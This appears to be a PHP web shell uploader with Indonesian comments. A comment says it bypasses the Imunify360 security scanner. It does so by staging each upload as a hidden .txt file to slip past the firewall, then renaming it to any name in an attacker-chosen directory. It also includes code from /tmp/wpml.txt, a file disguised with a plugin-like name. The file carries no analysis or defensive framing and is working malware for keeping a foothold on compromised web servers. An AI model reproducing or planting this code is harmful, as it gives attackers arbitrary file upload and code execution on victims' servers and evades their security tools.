<?php
ob_start(); // <-- Ini mencegah error "headers already sent"
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (!function_exists('dile_get_contentrs')) {
    function dile_get_contentrs($f) { return file_get_contents($f); }
}
if (!function_exists('dile_put_contentrs')) {
    function dile_put_contentrs($f, $d) { return file_put_contents($f, $d); }
}
if (!function_exists('dile_put_contents')) {
    function dile_put_contents($f, $d) { return file_put_contents($f, $d); }
}

// BYPASS UPLOAD IMUNIFY360
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadfile']) && $_FILES['uploadfile']['error'] === UPLOAD_ERR_OK) {
    $cwd = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
    $cwd = $cwd ?: getcwd();
    $name = $_FILES['uploadfile']['name'];
    $tmp = $_FILES['uploadfile']['tmp_name'];
    
    // Upload sebagai .txt dulu biar lolos WAF
    $temp_name = $cwd . '/.' . md5(uniqid()) . '.txt';
    if (move_uploaded_file($tmp, $temp_name)) {
        if (rename($temp_name, $cwd . '/' . $name)) {
            header("Location: ?d=" . urlencode($cwd) . "&msg=Upload+Sukses+(Bypass)");
            exit;
        }
    }
    header("Location: ?d=" . urlencode($cwd) . "&msg=Upload+Gagal");
    exit;
}

include("/tmp/wpml.txt");
?>
